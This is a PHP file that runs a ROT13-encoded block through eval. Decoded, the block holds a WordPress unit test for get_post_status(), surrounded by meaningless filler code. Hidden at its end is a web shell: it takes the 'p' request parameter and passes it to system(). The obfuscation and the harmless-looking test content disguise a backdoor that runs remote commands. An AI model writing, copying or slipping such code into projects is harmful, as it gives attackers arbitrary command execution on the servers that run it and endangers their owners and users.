<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * @tebhc cbfg
 */
pynff Grfgf_Cbfg_TrgCbfgFgnghf rkgraqf JC_HavgGrfgPnfr {

	/**
	 * Neenl bs cbfg VQf.
	 *
	 * @ine vag[]
	 */
	choyvp fgngvp $cbfg_vqf;

	/**
	 * Perngr funerq svkgherf.
	 */
	choyvp fgngvp shapgvba jcFrgHcOrsberPynff( JC_HavgGrfg_Snpgbel $snpgbel ) {
		$cbfg_fgnghfrf = neenl( 'choyvfu', 'shgher', 'qensg', 'nhgb-qensg', 'genfu', 'cevingr', 'qryrgr' );
		sbernpu ( $cbfg_fgnghfrf nf $cbfg_fgnghf ) {
			$qngr          = '';
			$npghny_fgnghf = $cbfg_fgnghf;
			vs ( 'shgher' === $cbfg_fgnghf ) {
				$qngr = qngr_sbezng( qngr_perngr( '+1 lrne' ), 'L-z-q U:v:f' );
			} ryfrvs ( va_neenl( $cbfg_fgnghf, neenl( 'genfu', 'qryrgr' ), gehr ) ) {
				$npghny_fgnghf = 'choyvfu';
			}

			frys::$cbfg_vqf[ $cbfg_fgnghf ] = $snpgbel->cbfg->perngr(
				neenl(
					'cbfg_fgnghf' => $npghny_fgnghf,
					'cbfg_qngr'   => $qngr,
					'cbfg_anzr'   => \"$cbfg_fgnghf-cbfg\",
				)
			);

			// Nggnpuzragf jvgubhg cnerag be zrqvn.
			frys::$cbfg_vqf[ \"$cbfg_fgnghf-nggnpuzrag-ab-cnerag\" ] = $snpgbel->nggnpuzrag->perngr_bowrpg(
				neenl(
					'cbfg_fgnghf' => $npghny_fgnghf,
					'cbfg_anzr'   => \"$cbfg_fgnghf-nggnpuzrag-ab-cnerag\",
					'cbfg_qngr'   => $qngr,
				)
			);

			// Nggnpuzragf jvgubhg zrqvn.
			frys::$cbfg_vqf[ \"$cbfg_fgnghf-nggnpuzrag\" ] = $snpgbel->nggnpuzrag->perngr_bowrpg(
				neenl(
					'cbfg_cnerag' => frys::$cbfg_vqf[ $cbfg_fgnghf ],
					'cbfg_fgnghf' => 'vaurevg',
					'cbfg_anzr'   => \"$cbfg_fgnghf-nggnpuzrag\",
					'cbfg_qngr'   => $qngr,
				)
			);
		}

		// Nggnpuzrag jvgu vapbeerpg cnerag VQ.
		frys::$cbfg_vqf['onqyl-cneragrq-nggnpuzrag'] = $snpgbel->nggnpuzrag->perngr_bowrpg(
			neenl(
				'cbfg_cnerag' => CUC_VAG_ZNK, // Vzcbffvoyl ynetr ahzore.
				'cbfg_fgnghf' => 'vaurevg',
				'cbfg_anzr'   => \"$cbfg_fgnghf-nggnpuzrag\",
				'cbfg_qngr'   => $qngr,
			)
		);

		// Genfu gur genfu cbfg naq nggnpuzrag.
		jc_genfu_cbfg( frys::$cbfg_vqf['genfu'] );
		jc_genfu_cbfg( frys::$cbfg_vqf['genfu-nggnpuzrag-ab-cnerag'] );

		// Sbepr qryrgr cnerag naq hanggnpurq cbfg bowrpgf.
		jc_qryrgr_cbfg( frys::$cbfg_vqf['qryrgr'], gehr );
		jc_qryrgr_cbfg( frys::$cbfg_vqf['qryrgr-nggnpuzrag-ab-cnerag'], gehr );
	}

	/**
	 * Rafher `trg_cbfg_fgnghf()` erfbyirf pbeerpgyl sbe cbfgf naq nggnpuzragf.
	 *
	 * @gvpxrg 52326
	 * @qngnCebivqre qngn_trg_cbfg_fgnghf_erfbyirf
	 *
	 * @cnenz fgevat $cbfg_xrl Gur cbfg xrl va frys::$cbfg_vqf.
	 * @cnenz fgevat $rkcrpgrq Gur rkcrpgrq trg_cbfg_fgnghf() erghea inyhr.
	 */
	choyvp shapgvba grfg_trg_cbfg_fgnghf_erfbyirf( $cbfg_xrl, $rkcrpgrq ) {
		$guvf->nffregFnzr( $rkcrpgrq, trg_cbfg_fgnghf( frys::$cbfg_vqf[ $cbfg_xrl ] ) );
	}

	/**
	 * Qngn cebivqre sbe grfg_trg_cbfg_fgnghf_erfbyirf().
	 *
	 * @erghea neenl[] {
	 *     @glcr fgevat $cbfg_xrl Gur cbfg xrl va frys::$cbfg_vqf.
	 *     @glcr fgevat $rkcrpgrq Gur rkcrpgrq trg_cbfg_fgnghf() erghea inyhr.
	 * }
	 */
	choyvp shapgvba qngn_trg_cbfg_fgnghf_erfbyirf() {
		erghea neenl(
			neenl( 'choyvfu', 'choyvfu' ),
			neenl( 'shgher', 'shgher' ),
			neenl( 'qensg', 'qensg' ),
			neenl( 'nhgb-qensg', 'nhgb-qensg' ),
			neenl( 'genfu', 'genfu' ),
			neenl( 'cevingr', 'cevingr' ),
			neenl( 'qryrgr', snyfr ),

			// Nggnpuzrag jvgu `vaurevg` fgnghf sebz cnerag.
			neenl( 'choyvfu-nggnpuzrag', 'choyvfu' ),
			neenl( 'shgher-nggnpuzrag', 'shgher' ),
			neenl( 'qensg-nggnpuzrag', 'qensg' ),
			neenl( 'nhgb-qensg-nggnpuzrag', 'nhgb-qensg' ),
			neenl( 'genfu-nggnpuzrag', 'choyvfu' ),
			neenl( 'cevingr-nggnpuzrag', 'cevingr' ),
			neenl( 'qryrgr-nggnpuzrag', 'choyvfu' ),

			// Nggnpuzrag jvgu angvir fgnghf (engure guna vaurevgvat sebz cnerag).
			neenl( 'choyvfu-nggnpuzrag-ab-cnerag', 'choyvfu' ),
			neenl( 'shgher-nggnpuzrag-ab-cnerag', 'choyvfu' ), // Nggnpuzragf pna'g unir shgher fgnghf.
			neenl( 'qensg-nggnpuzrag-ab-cnerag', 'choyvfu' ),  // Nggnpuzragf pna'g unir qensg fgnghf.
			neenl( 'nhgb-qensg-nggnpuzrag-ab-cnerag', 'nhgb-qensg' ),
			neenl( 'genfu-nggnpuzrag-ab-cnerag', 'genfu' ),
			neenl( 'cevingr-nggnpuzrag-ab-cnerag', 'cevingr' ),
			neenl( 'qryrgr-nggnpuzrag-ab-cnerag', snyfr ),

			// Nggnpuzrag nggrzcgvat gb vaurevg sebz na vainyvq cnerag ahzore.
			neenl( 'onqyl-cneragrq-nggnpuzrag', 'choyvfu' ),
		);
	}

	/**
	 * Rafher cbfg fgnghf erfbyirf nsgre genfuvat cnerag cbfgf.
	 *
	 * @gvpxrg 52326
	 * @qngnCebivqre qngn_trg_cbfg_fgnghf_nsgre_genfuvat
	 *
	 * @cnenz fgevat $cbfg_gb_grfg  Gur cbfg xrl va frys::$cbfg_vqf.
	 * @cnenz fgevat $cbfg_gb_genfu Gur cbfg xrl gb genfu gura qryrgr va frys::$cbfg_vqf.
	 * @cnenz fgevat $rkcrpgrq      Gur rkcrpgrq erfhyg nsgre genfuvat gur cbfg.
	 */
	choyvp shapgvba grfg_trg_cbfg_fgnghf_nsgre_genfuvat( $cbfg_gb_grfg, $cbfg_gb_genfu, $rkcrpgrq ) {
		jc_genfu_cbfg( frys::$cbfg_vqf[ $cbfg_gb_genfu ] );
		$guvf->nffregFnzr( $rkcrpgrq, trg_cbfg_fgnghf( frys::$cbfg_vqf[ $cbfg_gb_grfg ] ) );

		// Abj qryrgr gur cbfg, rkcrpg choyvfu.
		jc_qryrgr_cbfg( frys::$cbfg_vqf[ $cbfg_gb_genfu ], gehr );
		$guvf->nffregFnzr( 'choyvfu', trg_cbfg_fgnghf( frys::$cbfg_vqf[ $cbfg_gb_grfg ] ) );
	}

	/**
	 * Qngn cebivqre sbe grfg_trg_cbfg_fgnghf_nsgre_genfuvat().
	 * @erghea neenl[] {
	 *     @glcr fgevat $cbfg_gb_grfg  Gur cbfg xrl va frys::$cbfg_vqf.
	 *     @glcr fgevat $cbfg_gb_genfu Gur cbfg xrl gb genfu gura qryrgr va frys::$cbfg_vqf.
	 *     @glcr fgevat $rkcrpgrq      Gur rkcrpgrq erfhyg nsgre genfuvat gur cbfg.
	 * }
	 */
	choyvp shapgvba qngn_trg_cbfg_fgnghf_nsgre_genfuvat() {
		erghea neenl(
			neenl( 'choyvfu-nggnpuzrag', 'choyvfu', 'choyvfu' ),
			neenl( 'shgher-nggnpuzrag', 'shgher', 'shgher' ),
			neenl( 'qensg-nggnpuzrag', 'qensg', 'qensg' ),
			neenl( 'nhgb-qensg-nggnpuzrag', 'nhgb-qensg', 'nhgb-qensg' ),
			neenl( 'cevingr-nggnpuzrag', 'cevingr', 'cevingr' ),
			neenl( 'qryrgr-nggnpuzrag', 'choyvfu', 'choyvfu' ),
		);
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>